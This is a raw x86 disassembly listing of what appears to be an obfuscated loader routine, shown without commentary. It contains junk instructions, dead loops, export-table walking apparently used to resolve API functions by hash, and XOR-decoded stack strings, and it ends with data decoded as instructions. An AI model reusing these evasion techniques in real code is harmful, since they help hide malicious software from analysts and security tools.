  4233b0:	mov    eax,DWORD PTR [ebp-0x1c]
  4233b3:	add    DWORD PTR [eax],edx
  4233b5:	mov    edx,DWORD PTR [ebp+0xc]
  4233b8:	mov    eax,ds:0x42836b
  4233bd:	xor    edx,edi
  4233bf:	add    edx,ebx
  4233c1:	xor    ebx,ebx
  4233c3:	add    edx,esi
  4233c5:	adc    ebx,0xffffffff
  4233c8:	xor    edi,edi
  4233ca:	xor    edx,ecx
  4233cc:	xor    ebx,0x0
  4233cf:	add    eax,esi
  4233d1:	adc    edi,0xffffffff
  4233d4:	xor    eax,ecx
  4233d6:	xor    edi,0x0
  4233d9:	cmp    eax,edx
  4233db:	jne    0x4233f3
  4233e1:	cmp    edi,ebx
  4233e3:	jne    0x4233f3
  4233e9:	mov    eax,ds:0x42836b
  4233ee:	mov    ds:0x428373,eax
  4233f3:	mov    eax,ds:0x4282ef
  4233f8:	push   0x4
  4233fa:	add    eax,0x1cc
  4233ff:	push   eax
  423400:	lea    eax,[ebp-0xc]
  423403:	push   eax
  423404:	call   0x40aa5b
  423409:	mov    eax,DWORD PTR [ebp-0xc]
  42340c:	mov    eax,DWORD PTR [eax]
  42340e:	pop    edi
  42340f:	pop    esi
  423410:	pop    ebx
  423411:	leave  
  423412:	ret    0xc
  423415:	xor    eax,eax
  423417:	add    DWORD PTR ds:0x4285f3,0x36c3
  423421:	inc    eax
  423422:	ret    
  423423:	push   ebp
  423424:	mov    ebp,esp
  423426:	push   ecx
  423427:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  42342e:	dec    edx
  42342f:	mov    eax,DWORD PTR [ebp+0x8]
  423432:	sbb    DWORD PTR ds:0x42864b,0x3b56
  42343c:	movsx  eax,BYTE PTR [eax]
  42343f:	xor    edx,edx
  423441:	xor    edx,DWORD PTR ds:0x428653
  423447:	or     edx,DWORD PTR ds:0x428637
  42344d:	mov    DWORD PTR ds:0x428653,edx
  423453:	mov    edx,0x3272ec
  423458:	mov    ecx,DWORD PTR ds:0x428607
  42345e:	adc    DWORD PTR ds:0x42865b,ecx
  423464:	sub    eax,edx
  423466:	movzx  ecx,WORD PTR ds:0x4285ff
  42346d:	sbb    DWORD PTR ds:0x42864f,ecx
  423473:	mov    ecx,0x75108a4
  423478:	or     DWORD PTR ds:0x4285d3,0x42864b
  423482:	xor    eax,ecx
  423484:	cmp    eax,0xf89c85c5
  423489:	mov    DWORD PTR ds:0x42864f,0x82b
  423493:	jne    0x4234d8
  423499:	adc    DWORD PTR ds:0x428633,ecx
  42349f:	mov    eax,DWORD PTR [ebp+0x8]
  4234a2:	push   esi
  4234a3:	sub    DWORD PTR ds:0x4285e7,edi
  4234a9:	mov    esi,DWORD PTR [ebp+0x8]
  4234ac:	and    DWORD PTR ds:0x4285e3,0x244e
  4234b6:	add    esi,DWORD PTR [eax+0x3c]
  4234b9:	mov    DWORD PTR [ebp+0x8],esi
  4234bc:	mov    eax,DWORD PTR [ebp-0x4]
  4234bf:	mov    esi,DWORD PTR [ebp+0x8]
  4234c2:	xor    eax,ecx
  4234c4:	add    eax,edx
  4234c6:	cmp    DWORD PTR [esi+0x54],eax
  4234c9:	pop    esi
  4234ca:	je     0x4234d8
  4234d0:	mov    eax,DWORD PTR [ebp+0x8]
  4234d3:	jmp    0x4234df
  4234d8:	mov    eax,DWORD PTR [ebp-0x4]
  4234db:	xor    eax,ecx
  4234dd:	add    eax,edx
  4234df:	leave  
  4234e0:	ret    0x4
  4234e3:	push   ebp
  4234e4:	mov    ebp,esp
  4234e6:	sub    esp,0xc
  4234e9:	push   esi
  4234ea:	xor    DWORD PTR ds:0x428617,edi
  4234f0:	mov    esi,0xf89c85b0
  4234f5:	xor    edx,DWORD PTR ds:0x428657
  4234fb:	mov    DWORD PTR [ebp-0x8],esi
  4234fe:	sub    ecx,ecx
  423500:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  423507:	add    ecx,DWORD PTR ds:0x4285e3
  42350d:	push   edi
  42350e:	mov    eax,eax
  423510:	and    DWORD PTR ds:0x4285ff,0x0
  42351a:	xor    eax,eax
  42351c:	add    eax,DWORD PTR ds:0x4285ff
  423522:	inc    eax
  423523:	mov    ds:0x4285ff,eax
  423528:	cmp    DWORD PTR ds:0x4285ff,0x20
  42352f:	ja     0x423552
  423535:	jmp    0x423545
  42353a:	push   0x2fb5
  42353f:	call   DWORD PTR ds:0x4287a3
  423545:	cmp    DWORD PTR ds:0x4285ff,0x10
  42354c:	jb     0x42351a
  423552:	mov    eax,DWORD PTR [ebp-0x4]
  423555:	and    DWORD PTR ds:0x42862f,0x0
  42355f:	jmp    0x423571
  423564:	mov    ecx,DWORD PTR ds:0x42862f
  42356a:	inc    ecx
  42356b:	mov    DWORD PTR ds:0x42862f,ecx
  423571:	cmp    DWORD PTR ds:0x42862f,0x19
  423578:	jae    0x4235a3
  42357e:	cmp    DWORD PTR ds:0x42862f,0x22
  423585:	ja     0x4235a3
  42358b:	jmp    0x42359e
  423590:	push   DWORD PTR [ebp-0x28]
  423593:	push   0x428028
  423598:	call   DWORD PTR ds:0x4287a7
  42359e:	jmp    0x423564
  4235a3:	mov    edi,DWORD PTR [ebp-0x8]
  4235a6:	mov    ecx,0x75108a4
  4235ab:	xor    eax,ecx
  4235ad:	sbb    edx,DWORD PTR ds:0x428637
  4235b3:	xor    edi,ecx
  4235b5:	mov    edx,0x3272ec
  4235ba:	add    edi,edx
  4235bc:	mov    DWORD PTR ds:0x42861b,0x1914
  4235c6:	add    eax,edx
  4235c8:	mov    DWORD PTR ds:0x42863b,0x6a3e
  4235d2:	imul   eax,edi
  4235d5:	mov    DWORD PTR ds:0x428613,ebx
  4235db:	mov    edi,DWORD PTR [ebp+0xc]
  4235de:	mov    DWORD PTR ds:0x428647,0x7cb7
  4235e8:	cmp    edi,eax
  4235ea:	je     0x423641
  4235f0:	not    eax
  4235f2:	mov    DWORD PTR [ebp-0xc],esi
  4235f5:	mov    eax,DWORD PTR [ebp-0xc]
  4235f8:	mov    esi,DWORD PTR [ebp+0xc]
  4235fb:	xor    eax,ecx
  4235fd:	lea    eax,[eax*8+0x19397d8]
  423604:	mov    eax,DWORD PTR [esi+eax*1]
  423607:	mov    DWORD PTR [ebp+0xc],eax
  42360a:	mov    eax,DWORD PTR [ebp-0x4]
  42360d:	mov    esi,DWORD PTR [ebp-0x8]
  423610:	xor    eax,ecx
  423612:	xor    esi,ecx
  423614:	add    esi,edx
  423616:	add    eax,edx
  423618:	imul   eax,esi
  42361b:	mov    esi,DWORD PTR [ebp+0xc]
  42361e:	cmp    esi,eax
  423620:	je     0x423641
  423626:	mov    eax,DWORD PTR [ebp-0x4]
  423629:	xor    eax,ecx
  42362b:	mov    ecx,DWORD PTR [ebp+0xc]
  42362e:	add    eax,edx
  423630:	imul   eax,ecx
  423633:	add    eax,DWORD PTR [ebp+0x8]
  423636:	mov    DWORD PTR [ebp+0xc],eax
  423639:	mov    eax,DWORD PTR [ebp+0xc]
  42363c:	jmp    0x423652
  423641:	mov    eax,DWORD PTR [ebp-0x4]
  423644:	mov    esi,DWORD PTR [ebp-0x8]
  423647:	xor    esi,ecx
  423649:	xor    eax,ecx
  42364b:	add    esi,edx
  42364d:	add    eax,edx
  42364f:	imul   eax,esi
  423652:	pop    edi
  423653:	pop    esi
  423654:	leave  
  423655:	ret    0x8
  423658:	push   ebp
  423659:	mov    ebp,esp
  42365b:	sub    esp,0x38
  42365e:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  423665:	sub    DWORD PTR ds:0x428607,edi
  42366b:	push   ebx
  42366c:	adc    DWORD PTR ds:0x4285d3,0x5ead
  423676:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  42367d:	mov    eax,DWORD PTR [ebp-0x4]
  423680:	push   esi
  423681:	movzx  esi,WORD PTR ds:0x42865f
  423688:	or     esi,DWORD PTR ds:0x428643
  42368e:	mov    DWORD PTR ds:0x42865f,esi
  423694:	mov    esi,0x75108a4
  423699:	xor    eax,esi
  42369b:	push   edi
  42369c:	movzx  edi,WORD PTR ds:0x42862f
  4236a3:	add    edi,DWORD PTR ds:0x4285d3
  4236a9:	mov    DWORD PTR ds:0x42862f,edi
  4236af:	mov    edi,0x3272ec
  4236b4:	add    eax,edi
  4236b6:	and    DWORD PTR ds:0x42864f,0x1fff
  4236c0:	mov    DWORD PTR [ebp-0x1c],eax
  4236c3:	mov    eax,ds:0x4285d7
  4236c8:	sbb    DWORD PTR ds:0x42866b,eax
  4236ce:	mov    eax,DWORD PTR [ebp+0x14]
  4236d1:	test   eax,eax
  4236d3:	mov    DWORD PTR ds:0x42861b,0x61b5
  4236dd:	je     0x4236ed
  4236e3:	xor    eax,eax
  4236e5:	mov    eax,DWORD PTR [ebp+0x14]
  4236e8:	mov    eax,DWORD PTR [eax]
  4236ea:	mov    DWORD PTR [ebp-0x1c],eax
  4236ed:	and    DWORD PTR ds:0x42867b,ecx
  4236f3:	mov    eax,DWORD PTR [ebp-0x4]
  4236f6:	xor    eax,esi
  4236f8:	adc    DWORD PTR ds:0x4285eb,edx
  4236fe:	add    eax,edi
  423700:	and    DWORD PTR ds:0x4285eb,ecx
  423706:	mov    DWORD PTR [ebp-0x8],eax
  423709:	xor    eax,eax
  42370b:	mov    eax,DWORD PTR [ebp-0xc]
  42370e:	sub    DWORD PTR ds:0x428607,0x2824
  423718:	xor    eax,esi
  42371a:	or     DWORD PTR ds:0x428663,0xb3a
  423724:	add    eax,edi
  423726:	sub    DWORD PTR ds:0x428617,edx
  42372c:	mov    DWORD PTR [ebp-0x24],eax
  42372f:	mov    ebx,DWORD PTR ds:0x428667
  423735:	and    DWORD PTR ds:0x428603,ebx
  42373b:	mov    eax,DWORD PTR [ebp-0x4]
  42373e:	xor    eax,esi
  423740:	add    eax,edi
  423742:	and    DWORD PTR ds:0x428637,0x0
  42374c:	mov    ebx,DWORD PTR ds:0x428637
  423752:	inc    ebx
  423753:	mov    DWORD PTR ds:0x428637,ebx
  423759:	cmp    DWORD PTR ds:0x428637,0x23
  423760:	ja     0x423789
  423766:	jmp    0x42377c
  42376b:	push   0x428070
  423770:	push   DWORD PTR [ebp-0x14]
  423773:	push   DWORD PTR [ebp-0x14]
  423776:	call   DWORD PTR ds:0x4287ab
  42377c:	cmp    DWORD PTR ds:0x428637,0x17
  423783:	jb     0x42374c
  423789:	mov    DWORD PTR [ebp-0x30],eax
  42378c:	mov    ebx,DWORD PTR [ebp-0x4]
  42378f:	xor    ebx,esi
  423791:	add    ebx,edi
  423793:	adc    eax,DWORD PTR ds:0x428673
  423799:	mov    eax,DWORD PTR [ebp-0x24]
  42379c:	sub    eax,edi
  42379e:	lea    ecx,[ebx-0x3272ec]
  4237a4:	add    DWORD PTR ds:0x42861f,0x137d
  4237ae:	xor    eax,esi
  4237b0:	adc    DWORD PTR ds:0x428667,0x428613
  4237ba:	xor    ecx,esi
  4237bc:	cmp    ecx,eax
  4237be:	je     0x423ae3
  4237c4:	and    DWORD PTR ds:0x428667,0x0
  4237ce:	mov    eax,ds:0x428667
  4237d3:	inc    eax
  4237d4:	mov    ds:0x428667,eax
  4237d9:	cmp    DWORD PTR ds:0x428667,0x22
  4237e0:	jge    0x423803
  4237e6:	jmp    0x4237f6
  4237eb:	push   0x428056
  4237f0:	call   DWORD PTR ds:0x4287af
  4237f6:	cmp    DWORD PTR ds:0x428667,0x14
  4237fd:	jb     0x4237ce
  423803:	mov    eax,DWORD PTR [ebp-0x4]
  423806:	add    DWORD PTR ds:0x42862b,0x428657
  423810:	xor    eax,esi
  423812:	add    eax,edi
  423814:	mov    DWORD PTR ds:0x42863b,0x5900
  42381e:	cmp    ebx,eax
  423820:	mov    DWORD PTR ds:0x42864b,0x1e0f
  42382a:	jne    0x423a31
  423830:	sbb    DWORD PTR ds:0x42866f,0x4285df
  42383a:	push   DWORD PTR [ebp+0x8]
  42383d:	sub    DWORD PTR ds:0x428653,0x2050
  423847:	call   0x423423
  42384c:	mov    DWORD PTR [ebp-0x14],eax
  42384f:	mov    eax,DWORD PTR [ebp-0x4]
  423852:	xor    DWORD PTR ds:0x428603,0x42865b
  42385c:	mov    ecx,DWORD PTR [ebp-0x14]
  42385f:	sbb    DWORD PTR ds:0x42866f,0x5022
  423869:	xor    eax,esi
  42386b:	adc    DWORD PTR ds:0x42867b,0x428657
  423875:	add    eax,edi
  423877:	mov    DWORD PTR ds:0x4285e7,0x3cb8
  423881:	cmp    ecx,eax
  423883:	je     0x423bc6
  423889:	sbb    DWORD PTR ds:0x4285ef,0x428613
  423893:	push   DWORD PTR [ebp-0x14]
  423896:	or     DWORD PTR ds:0x42866b,0x13a4
  4238a0:	push   DWORD PTR [ebp+0x8]
  4238a3:	and    DWORD PTR ds:0x4285cf,0x6488
  4238ad:	call   0x4234e3
  4238b2:	mov    DWORD PTR [ebp-0x14],eax
  4238b5:	mov    ecx,DWORD PTR ds:0x4286c7
  4238bb:	mov    eax,ds:0x4286ff
  4238c0:	sub    ecx,eax
  4238c2:	sub    ecx,DWORD PTR [ecx+eax*1]
  4238c5:	mov    eax,DWORD PTR [ebp-0x4]
  4238c8:	mov    DWORD PTR ds:0x4285e3,0x1e
  4238d2:	cmp    DWORD PTR ds:0x4285e3,0x0
  4238d9:	je     0x423913
  4238df:	cmp    DWORD PTR ds:0x4285e3,0x27
  4238e6:	ja     0x423913
  4238ec:	jmp    0x423901
  4238f1:	push   0x4c54
  4238f6:	push   0x42862f
  4238fb:	call   DWORD PTR ds:0x4287b3
  423901:	mov    ecx,DWORD PTR ds:0x4285e3
  423907:	dec    ecx
  423908:	mov    DWORD PTR ds:0x4285e3,ecx
  42390e:	jmp    0x4238d2
  423913:	mov    ecx,DWORD PTR [ebp-0x14]
  423916:	mov    DWORD PTR ds:0x4285f3,0x1814
  423920:	xor    eax,esi
  423922:	add    DWORD PTR ds:0x428657,0x428637
  42392c:	add    eax,edi
  42392e:	mov    DWORD PTR ds:0x42863f,0xaaa
  423938:	cmp    ecx,eax
  42393a:	mov    DWORD PTR ds:0x42860f,0x626d
  423944:	je     0x423bc6
  42394a:	mov    eax,DWORD PTR [ebp-0x14]
  42394d:	or     ecx,0x1da9
  423953:	mov    eax,DWORD PTR [eax+0x18]
  423956:	sub    DWORD PTR ds:0x42865b,ecx
  42395c:	mov    DWORD PTR [ebp-0x24],eax
  42395f:	and    eax,0x4d45
  423964:	mov    eax,DWORD PTR [ebp-0x14]
  423967:	adc    ecx,0x37bd
  42396d:	mov    ecx,DWORD PTR [ebp+0x8]
  423970:	add    ecx,DWORD PTR [eax+0x20]
  423973:	movzx  eax,WORD PTR ds:0x4285d3
  42397a:	sbb    DWORD PTR ds:0x428657,eax
  423980:	mov    DWORD PTR [ebp-0x2c],ecx
  423983:	and    DWORD PTR ds:0x428627,0x1b49
  42398d:	mov    eax,DWORD PTR [ebp-0x14]
  423990:	mov    ecx,DWORD PTR [ebp+0x8]
  423993:	and    DWORD PTR ds:0x4285db,0x4285ef
  42399d:	add    ecx,DWORD PTR [eax+0x24]
  4239a0:	adc    DWORD PTR ds:0x4285e3,0x7baf
  4239aa:	mov    DWORD PTR [ebp-0x34],ecx
  4239ad:	and    DWORD PTR ds:0x428623,0x0
  4239b7:	jmp    0x4239ca
  4239bc:	xor    eax,eax
  4239be:	xor    eax,DWORD PTR ds:0x428623
  4239c4:	inc    eax
  4239c5:	mov    ds:0x428623,eax
  4239ca:	cmp    DWORD PTR ds:0x428623,0x1a
  4239d1:	jae    0x423a0c
  4239d7:	cmp    DWORD PTR ds:0x428623,0xd
  4239de:	jb     0x423a0c
  4239e4:	jmp    0x4239ef
  4239e9:	call   DWORD PTR ds:0x4287b7
  4239ef:	cmp    DWORD PTR ds:0x428623,0xc
  4239f6:	jne    0x423a07
  4239fc:	mov    eax,ds:0x428623
  423a01:	inc    eax
  423a02:	mov    ds:0x428623,eax
  423a07:	jmp    0x4239bc
  423a0c:	mov    eax,DWORD PTR [ebp-0x14]
  423a0f:	mov    ecx,DWORD PTR [ebp+0x8]
  423a12:	xor    DWORD PTR ds:0x428603,0x1ba
  423a1c:	add    ecx,DWORD PTR [eax+0x1c]
  423a1f:	mov    DWORD PTR [ebp-0x14],ecx
  423a22:	mov    DWORD PTR ds:0x4285df,0x6d54
  423a2c:	jmp    0x423b84
  423a31:	sbb    DWORD PTR ds:0x428657,0x267e
  423a3b:	mov    eax,DWORD PTR [ebp-0x2c]
  423a3e:	and    DWORD PTR ds:0x42865f,0x0
  423a48:	mov    ecx,DWORD PTR ds:0x42865f
  423a4e:	inc    ecx
  423a4f:	mov    DWORD PTR ds:0x42865f,ecx
  423a55:	cmp    DWORD PTR ds:0x42865f,0x24
  423a5c:	jl     0x423a7f
  423a62:	jmp    0x423a72
  423a67:	push   0x3051
  423a6c:	call   DWORD PTR ds:0x4287bb
  423a72:	cmp    DWORD PTR ds:0x42865f,0x1e
  423a79:	jb     0x423a48
  423a7f:	mov    ecx,DWORD PTR [ebp+0x8]
  423a82:	add    DWORD PTR ds:0x428617,0x4285ef
  423a8c:	add    ecx,DWORD PTR [eax+ebx*4]
  423a8f:	movzx  eax,BYTE PTR ds:0x4285d3
  423a96:	or     eax,DWORD PTR ds:0x428633
  423a9c:	mov    ds:0x4285d3,eax
  423aa1:	mov    DWORD PTR [ebp-0x28],ecx
  423aa4:	mov    eax,DWORD PTR [ebp-0x4]
  423aa7:	xor    DWORD PTR ds:0x42860b,0x227b
  423ab1:	mov    ecx,DWORD PTR [ebp-0x28]
  423ab4:	mov    DWORD PTR ds:0x428657,0x956
  423abe:	xor    eax,esi
  423ac0:	add    DWORD PTR ds:0x428637,0x428663
  423aca:	add    eax,edi
  423acc:	mov    DWORD PTR ds:0x42862f,0x1972
  423ad6:	cmp    ecx,eax
  423ad8:	je     0x423b84
  423ade:	jmp    0x423b43
  423ae3:	mov    eax,DWORD PTR [ebp-0x4]
  423ae6:	mov    DWORD PTR ds:0x42866f,0x10fc
  423af0:	mov    ecx,DWORD PTR [ebp-0x8]
  423af3:	or     DWORD PTR ds:0x42866f,0x42865f
  423afd:	xor    eax,esi
  423aff:	adc    DWORD PTR ds:0x4285eb,0x240b
  423b09:	add    eax,edi
  423b0b:	mov    DWORD PTR ds:0x428657,0x63ac
  423b15:	cmp    ecx,eax
  423b17:	mov    eax,DWORD PTR [ebp-0x4]
  423b1a:	je     0x423bc9
  423b20:	mov    ecx,DWORD PTR [ebp-0x30]
  423b23:	xor    eax,esi
  423b25:	mov    DWORD PTR ds:0x428613,0x1e55
  423b2f:	add    eax,edi
  423b31:	mov    DWORD PTR ds:0x428637,0x6483
  423b3b:	cmp    ecx,eax
  423b3d:	je     0x423bd2
  423b43:	adc    DWORD PTR ds:0x428603,0x42865b
  423b4d:	lea    eax,[ebp-0x8]
  423b50:	sub    DWORD PTR ds:0x428603,0x42860b
  423b5a:	push   eax
  423b5b:	sbb    DWORD PTR ds:0x42861b,0x4285f7
  423b65:	push   DWORD PTR [ebp-0x28]
  423b68:	sub    DWORD PTR ds:0x428617,0x428667
  423b72:	push   DWORD PTR [ebp+0xc]
  423b75:	adc    DWORD PTR ds:0x42863f,0x428633
  423b7f:	call   0x40f467
  423b84:	sub    DWORD PTR ds:0x4285d7,0x3834
  423b8e:	mov    eax,DWORD PTR [ebp-0x4]
  423b91:	mov    ecx,DWORD PTR [ebp-0x8]
  423b94:	xor    eax,esi
  423b96:	add    eax,edi
  423b98:	cmp    ecx,eax
  423b9a:	je     0x423bb5
  423ba0:	mov    eax,DWORD PTR [ebp-0x34]
  423ba3:	movzx  eax,WORD PTR [eax+ebx*2]
  423ba7:	mov    ecx,DWORD PTR [ebp-0x14]
  423baa:	mov    eax,DWORD PTR [ecx+eax*4]
  423bad:	mov    DWORD PTR [ebp-0x38],eax
  423bb0:	jmp    0x423ae3
  423bb5:	mov    eax,DWORD PTR [ebp-0xc]
  423bb8:	xor    eax,esi
  423bba:	lea    ebx,[ebx+eax*1+0x3272ec]
  423bc1:	jmp    0x423793
  423bc6:	mov    eax,DWORD PTR [ebp-0x4]
  423bc9:	xor    eax,esi
  423bcb:	add    eax,edi
  423bcd:	jmp    0x423cef
  423bd2:	mov    eax,DWORD PTR [ebp-0x38]
  423bd5:	add    eax,DWORD PTR [ebp+0x8]
  423bd8:	mov    DWORD PTR [ebp-0x18],eax
  423bdb:	mov    eax,DWORD PTR [ebp-0x1c]
  423bde:	test   eax,eax
  423be0:	je     0x423c7a
  423be6:	mov    DWORD PTR [ebp-0x20],0x0
  423bed:	push   0x3
  423bef:	xor    edx,edx
  423bf1:	pop    edx
  423bf2:	add    edx,0x8
  423bf5:	push   edx
  423bf6:	pop    ecx
  423bf7:	push   0x6
  423bf9:	dec    ecx
  423bfa:	pop    ebx
  423bfb:	dec    ebx
  423bfc:	xchg   ebx,ecx
  423bfe:	sub    ebx,ecx
  423c00:	xchg   ebx,ecx
  423c02:	dec    ecx
  423c03:	mov    eax,DWORD PTR [ebp-0x1c]
  423c06:	imul   eax,ecx
  423c09:	sub    esp,eax
  423c0b:	mov    DWORD PTR [ebp-0x20],esp
  423c0e:	mov    eax,DWORD PTR [ebp-0x4]
  423c11:	xor    eax,esi
  423c13:	add    eax,edi
  423c15:	jmp    0x423c53
  423c1a:	mov    ecx,DWORD PTR [ebp-0xc]
  423c1d:	mov    eax,DWORD PTR [ebp+0x8]
  423c20:	mov    edx,DWORD PTR [ebp+0x14]
  423c23:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  423c27:	xor    ecx,esi
  423c29:	add    ecx,edi
  423c2b:	xor    edx,edx
  423c2d:	div    ecx
  423c2f:	mov    ecx,DWORD PTR [ebp-0x4]
  423c32:	xor    ecx,esi
  423c34:	lea    eax,[ecx+eax*1+0x3272ec]
  423c3b:	mov    ecx,DWORD PTR [ebp+0x8]
  423c3e:	mov    edx,DWORD PTR [ebp-0x20]
  423c41:	mov    DWORD PTR [edx+ecx*4],eax
  423c44:	mov    eax,DWORD PTR [ebp-0xc]
  423c47:	mov    ecx,DWORD PTR [ebp+0x8]
  423c4a:	xor    eax,esi
  423c4c:	lea    eax,[eax+ecx*1+0x3272ec]
  423c53:	mov    DWORD PTR [ebp+0x8],eax
  423c56:	mov    eax,DWORD PTR [ebp-0xc]
  423c59:	mov    ecx,DWORD PTR [ebp+0x14]
  423c5c:	xor    eax,esi
  423c5e:	add    eax,edi
  423c60:	imul   eax,DWORD PTR [ecx]
  423c63:	mov    ecx,DWORD PTR [ebp-0x4]
  423c66:	mov    edx,DWORD PTR [ebp+0x8]
  423c69:	xor    ecx,esi
  423c6b:	lea    ecx,[ecx+edx*1+0x3272ec]
  423c72:	cmp    ecx,eax
  423c74:	jne    0x423c1a
  423c7a:	mov    eax,DWORD PTR [ebp-0x4]
  423c7d:	xor    eax,esi
  423c7f:	add    eax,edi
  423c81:	mov    DWORD PTR [ebp-0x10],eax
  423c84:	mov    ebx,0x65655
  423c89:	add    ebx,0x3234
  423c8f:	xchg   ebx,esi
  423c91:	xor    ebx,ebx
  423c93:	push   esi
  423c94:	mov    esi,ebx
  423c96:	pop    ebx
  423c97:	mov    edx,esi
  423c99:	add    ebx,0x1002
  423c9f:	lea    eax,[ebp-0x18]
  423ca2:	add    edx,eax
  423ca4:	add    edx,0x5
  423ca7:	push   edx
  423ca8:	inc    esi
  423ca9:	pop    ecx
  423caa:	dec    ecx
  423cab:	xchg   ecx,eax
  423cac:	dec    eax
  423cad:	xchg   ecx,eax
  423cae:	dec    ecx
  423caf:	xchg   ecx,edx
  423cb1:	dec    edx
  423cb2:	push   edx
  423cb3:	mov    edx,ebx
  423cb5:	pop    ebx
  423cb6:	dec    ebx
  423cb7:	call   DWORD PTR [ebx]
  423cb9:	cmp    DWORD PTR [ebp+0x10],esi
  423cbc:	je     0x423cdb
  423cc2:	xchg   edx,eax
  423cc3:	push   0xb
  423cc5:	pop    ecx
  423cc6:	push   0x4
  423cc8:	pop    ebx
  423cc9:	inc    ebx
  423cca:	xchg   ebx,ecx
  423ccc:	sub    ebx,ecx
  423cce:	xchg   ebx,ecx
  423cd0:	dec    ecx
  423cd1:	dec    ecx
  423cd2:	mov    eax,DWORD PTR [ebp-0x1c]
  423cd5:	imul   eax,ecx
  423cd8:	add    esp,eax
  423cda:	xchg   edx,eax
  423cdb:	push   eax
  423cdc:	xor    ebx,ebx
  423cde:	mov    edx,esp
  423ce0:	dec    edx
  423ce1:	inc    ebx
  423ce2:	add    ebx,DWORD PTR [edx+ebx*1]
  423ce5:	dec    ebx
  423ce6:	xor    edx,edx
  423ce8:	add    DWORD PTR [ebp-0x10],ebx
  423ceb:	pop    ebx
  423cec:	mov    eax,DWORD PTR [ebp-0x10]
  423cef:	pop    edi
  423cf0:	pop    esi
  423cf1:	pop    ebx
  423cf2:	leave  
  423cf3:	ret    0x10
	...
  423d02:	add    BYTE PTR [eax],al
  423d04:	mov    bl,0x8a
  423d06:	test   BYTE PTR [ebp+0x0],0x0
  423d0a:	add    BYTE PTR [eax],al
  423d0c:	add    al,BYTE PTR [eax]
  423d0e:	add    BYTE PTR [eax],al
  423d10:	xor    al,0x0
  423d12:	add    BYTE PTR [eax],al
  423d14:	and    BYTE PTR ds:0x31200002,bh
  423d1a:	add    al,BYTE PTR [eax]
  423d1c:	add    BYTE PTR [eax],al
  423d1e:	add    BYTE PTR [eax],al
  423d20:	push   edx
  423d21:	push   ebx
  423d22:	inc    esp
  423d23:	push   ebx
  423d24:	jno    0x423d05
  423d26:	fistp  WORD PTR [ebx]
  423d28:	pop    es
  423d29:	sub    cl,al
  423d2b:	inc    esp
  423d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d2d:	lahf   
  423d2e:	out    0x36,al
  423d30:	mov    al,0xd
  423d32:	jmp    0x423f31
  423d37:	add    BYTE PTR [ebp+0x3a],al
  423d3a:	pop    esp
  423d3b:	push   edx
  423d3c:	popa   
  423d3d:	ja     0x423d5f
  423d3f:	inc    esp
  423d40:	popa   
  423d41:	je     0x423da4
  423d43:	pop    esp
  423d44:	inc    ebp
  423d45:	outs   dx,BYTE PTR ds:[esi]
  423d46:	arpl   WORD PTR [edi+0x64],bp
  423d49:	gs fs inc esp
  423d4c:	popa   
  423d4d:	je     0x423db0
  423d4f:	inc    esi
  423d50:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x81ec558b
  423d58:	in     al,dx
  423d59:	or     BYTE PTR [ecx],al
  423d5b:	add    BYTE PTR [eax],al
  423d5d:	push   ebx
  423d5e:	mov    eax,ebx
  423d60:	xchg   ecx,eax
  423d61:	mov    eax,DWORD PTR [ebp+0x8]
  423d64:	cmp    eax,0xf89c85b0
  423d69:	jne    0x4241f0
  423d6f:	mov    eax,DWORD PTR [ebp+0xc]
  423d72:	cmp    eax,0xf89c85b1
  423d77:	jne    0x4241f0
  423d7d:	mov    eax,DWORD PTR [ebp+0x24]
  423d80:	mov    DWORD PTR [ebp-0x4],eax
  423d83:	mov    BYTE PTR [ebp-0x18],0x13
  423d87:	mov    BYTE PTR [ebp-0x17],0x1e
  423d8b:	mov    BYTE PTR [ebp-0x16],0x15
  423d8f:	mov    BYTE PTR [ebp-0x15],0x4f
  423d93:	mov    BYTE PTR [ebp-0x14],0x4c
  423d97:	mov    BYTE PTR [ebp-0x13],0x7a
  423d9b:	mov    BYTE PTR [ebp-0x20],0x1
  423d9f:	mov    BYTE PTR [ebp-0x1f],0xf
  423da3:	mov    BYTE PTR [ebp-0x1e],0x11
  423da7:	mov    BYTE PTR [ebp-0x1d],0xc
  423dab:	mov    BYTE PTR [ebp-0x1c],0x4f
  423daf:	mov    BYTE PTR [ebp-0x1b],0x4c
  423db3:	mov    BYTE PTR [ebp-0x1a],0x7a
  423db7:	mov    BYTE PTR [ebp-0x28],0xf
  423dbb:	mov    BYTE PTR [ebp-0x27],0x12
  423dbf:	mov    BYTE PTR [ebp-0x26],0x16
  423dc3:	mov    BYTE PTR [ebp-0x25],0x3
  423dc7:	mov    BYTE PTR [ebp-0x24],0x1d
  423dcb:	mov    BYTE PTR [ebp-0x23],0xa
  423dcf:	push   esi
  423dd0:	mov    BYTE PTR [ebp-0x22],0x15
  423dd4:	mov    BYTE PTR [ebp-0x21],0x7a
  423dd8:	xor    esi,esi
  423dda:	mov    eax,0xfd
  423ddf:	lea    ecx,[ebp+esi*1-0x18]
  423de3:	movzx  edx,BYTE PTR [ecx]
  423de6:	xor    edx,0x79
  423de9:	add    edx,eax
  423deb:	inc    esi
  423dec:	mov    BYTE PTR [ecx],dl
  423dee:	cmp    esi,0x6
  423df1:	jb     0x423ddf
  423df3:	xor    esi,esi
  423df5:	lea    ecx,[ebp+esi*1-0x20]
  423df9:	movzx  edx,BYTE PTR [ecx]
  423dfc:	xor    edx,0x79
  423dff:	add    edx,eax
  423e01:	inc    esi
  423e02:	mov    BYTE PTR [ecx],dl
  423e04:	cmp    esi,0x7
  423e07:	jb     0x423df5
  423e09:	xor    esi,esi
  423e0b:	lea    ecx,[ebp+esi*1-0x28]
  423e0f:	movzx  edx,BYTE PTR [ecx]
  423e12:	xor    edx,0x79
  423e15:	add    edx,eax
  423e17:	inc    esi
  423e18:	mov    BYTE PTR [ecx],dl
  423e1a:	cmp    esi,0x8
  423e1d:	jb     0x423e0b
  423e1f:	lea    eax,[ebp-0x2c]
  423e22:	mov    DWORD PTR [ebp-0x8],eax
  423e25:	mov    ecx,DWORD PTR [ebp-0x8]
  423e28:	mov    eax,0x7113fcce
  423e2d:	mov    DWORD PTR [ecx],eax
  423e2f:	mov    ecx,DWORD PTR [ebp-0x2c]
  423e32:	push   edi
  423e33:	mov    esi,0x4e3e
  423e38:	mov    ebx,0x3272ec
  423e3d:	cmp    ecx,eax
